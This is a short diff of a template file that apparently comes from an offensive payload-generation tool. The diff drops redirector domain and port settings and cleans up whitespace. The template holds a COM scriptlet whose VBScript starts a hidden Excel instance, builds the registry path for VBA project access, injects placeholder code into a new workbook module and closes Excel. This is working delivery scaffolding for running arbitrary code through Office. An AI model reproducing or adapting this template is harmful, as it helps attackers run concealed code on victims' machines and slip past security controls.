@@ -2,12 +2,6 @@
 value: notSet
 process: decEncode
 
-[RedirectorDomain]
-value: notSet
-
-[RedirectorPort]
-value: notSet
-
 [Processx86]
 value: notSet
 
@@ -23,11 +17,11 @@ value: notSet
 [Template]
 data:	<?XML version="1.0"?>
 		<scriptlet>
-		<registration 
+		<registration
 		    progid="newTest"
 		    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
 			<script language="VBScript">
-				<![CDATA[	
+				<![CDATA[
 					Function Register
 						MsgBox ""
 					End Function
@@ -40,19 +34,19 @@ data:	<?XML version="1.0"?>
 		</public>
 
 		<script language="VBScript">
-			<![CDATA[	
+			<![CDATA[
 
 			Function Test()
 				Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule
-				
+
 				Set objExcel = CreateObject("Excel.Application")
 				objExcel.Visible = False
-			
-				Application_Version = objExcel.Version	
+
+				Application_Version = objExcel.Version
 				Set WshShell = CreateObject("Wscript.Shell")
-				
+
 				strRegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application_Version & "\Excel\Security\AccessVBOM"
-			
+
 				Set objWorkbook = objExcel.Workbooks.Add()
 				Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
 				strCode = ${Processing:value}
@@ -62,7 +56,7 @@ data:	<?XML version="1.0"?>
 				objWorkbook.Close False
 				objExcel.Quit
 			End Function
-			
+
 			]]>
 		</script>
 		</scriptlet>
